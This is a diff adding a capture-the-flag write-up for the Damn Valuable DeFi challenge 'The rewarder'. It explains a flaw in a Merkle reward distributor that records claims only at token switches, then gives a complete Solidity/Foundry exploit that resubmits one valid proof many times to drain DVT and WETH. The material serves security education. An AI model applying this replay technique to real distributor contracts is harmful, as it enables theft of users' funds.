@@ -286,3 +286,100 @@ This attack allows us to drain all ETH from the pool without actually owning any
         loanReceiver.callFlashLoan(ETHER_IN_POOL);
         loanReceiver.withdraw();
     }
+
+## 5. The rewarder
+
+### Challenge overview
+
+A contract is distributing rewards of Damn Valuable Tokens and WETH.
+To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.
+Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.
+Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.
+
+### Vulnerability Analysis
+
+Only way to get he funds is the claimRewards() function, so let's focus on that. The function allows us to claim both DVT ans WETH rewards with one request. 
+The first vulnerability we can notice is that the function marks our reward claimed in two cases:
+    1. During the last iteration
+    2. When token to claim changes
+
+Also, there's no limit on how many claims we can process in a single transaction. This creates an exploit path where we can submit multiple identical claims (using the same valid Merkle proof since 'player' is a legitimate beneficiary) for the same token and batch. Since the contract only marks claims as claimed at token switches or at the end of processing, we can claim our reward multiple times and drain the contract.
+
+Attack flow:
+1. Read the distribution JSON files to find our legitimate claim amount for DVT and WETH tokens
+2. Create an array of multiple claims for the same token and same batch (batch 0)
+3. For each token:
+   - Make the first claim with a valid Merkle proof (since our address is on the beneficiary list)
+   - Make multiple subsequent claims with the same Merkle proof
+   - The contract will verify the proof for each claim but only mark the batch as claimed after processing all claims
+4. Execute the transaction to drain nearly all tokens from the distributor 
+5. Transfer all recovered assets to the designated recovery account
+
+### Solution
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_theRewarder() public checkSolvedByPlayer {
+        
+        string memory dvtDistributuion = vm.readFile("test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtDistributuion), (Reward[]));
+
+        string memory wethDistribution = vm.readFile("test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethDistribution), (Reward[]));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+    
+        uint256 dvtAmount;
+        bytes32[] memory dvtProof;
+        for (uint256 i = 0; i < dvtRewards.length; i++) {
+            if (dvtRewards[i].beneficiary == player) {
+                dvtAmount = dvtRewards[i].amount;
+                dvtProof = merkle.getProof(dvtLeaves, i);
+                break;
+            }
+        }
+
+        uint256 wethAmount;
+        bytes32[] memory wethProof;
+        for (uint256 i = 0; i < wethRewards.length; i++) {
+            if (wethRewards[i].beneficiary == player) {
+                wethAmount = wethRewards[i].amount;
+                wethProof = merkle.getProof(wethLeaves, i);
+                break;
+            }
+        }
+
+        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
+        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
+        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;
+
+        Claim[] memory claims = new Claim[](totalClaimsNeeded);
+        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
+            if (i < dvtClaimsNeeded) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: dvtAmount,
+                    tokenIndex: 0,
+                    proof: dvtProof
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: wethAmount,
+                    tokenIndex: 1,
+                    proof: wethProof
+                });
+            }
+        }
+
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        distributor.claimRewards(claims, tokens);
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
